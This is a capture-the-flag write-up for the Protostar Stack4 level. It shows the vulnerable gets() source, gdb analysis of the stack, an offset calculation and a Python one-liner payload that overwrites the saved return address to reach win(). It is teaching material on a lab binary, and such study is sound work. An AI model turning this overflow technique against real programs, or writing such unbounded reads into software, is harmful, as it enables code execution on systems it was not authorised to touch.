# Stack4

## Description

Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

This level is at `/opt/protostar/bin/stack4`

### Hints

- A variety of introductory papers into buffer overflows may help.
- gdb lets you do “run < input”
- EIP is not directly after the end of buffer, compiler padding can also increase the size.

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

## Approach

Let's analyse the binary with `GDB`.

```bash
(gdb) disassemble main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
0x0804841e <main+22>:   ret
End of assembler dump.

(gdb) disassemble win
Dump of assembler code for function win:
0x080483f4 <win+0>:     push   ebp
0x080483f5 <win+1>:     mov    ebp,esp
0x080483f7 <win+3>:     sub    esp,0x18
0x080483fa <win+6>:     mov    DWORD PTR [esp],0x80484e0
0x08048401 <win+13>:    call   0x804832c <puts@plt>
0x08048406 <win+18>:    leave
0x08048407 <win+19>:    ret
End of assembler dump.

(gdb) b *main+21
Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.

(gdb) r
Starting program: /opt/protostar/bin/stack4 
AAAAAAAAAAAAAAAAAAAAAAA
0xbffff760:     0xbffff770      0xb7ec6165      0xbffff778      0xb7eada75
0xbffff770:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff780:     0x41414141      0x00414141      0xbffff7b8      0x08048449
0xbffff790:     0xb7fd8304      0xb7fd7ff4      0x08048430      0xbffff7b8
0xbffff7a0:     0xb7ec6365      0xb7ff1040      0x0804843b      0xb7fd7ff4
0xbffff7b0:     0x08048430      0x00000000      0xbffff838      0xb7eadc76
0x804841d <main+21>:    leave  
0x804841e <main+22>:    ret    

Breakpoint 1, main (argc=1, argv=0xbffff864) at stack4/stack4.c:16
16      stack4/stack4.c: No such file or directory.
        in stack4/stack4.c

(gdb) x/x $ebp
0xbffff7b8:     0xbffff838
```

Input characters starts at `0xbffff770` and It's base at `0xbffff838`. Let's make some calculation, How much bytes we need to smash the memory.

```bash
(gdb) p/d $ebp - 0xbffff770
$1 = 72

(gdb) p/d $ebp - 0xbffff770 + 4
$2 = 76
```

Added 4 bytes to skip the saved frame pointer.

## Exploitation

Let's Make a payload of 76 bytes then add return address and exploit.

```bash
python -c 'import struct; print "A"*(64+12)+struct.pack("I",0x080483f4)' > ~/exp && ./stack4 < ~/exp
```
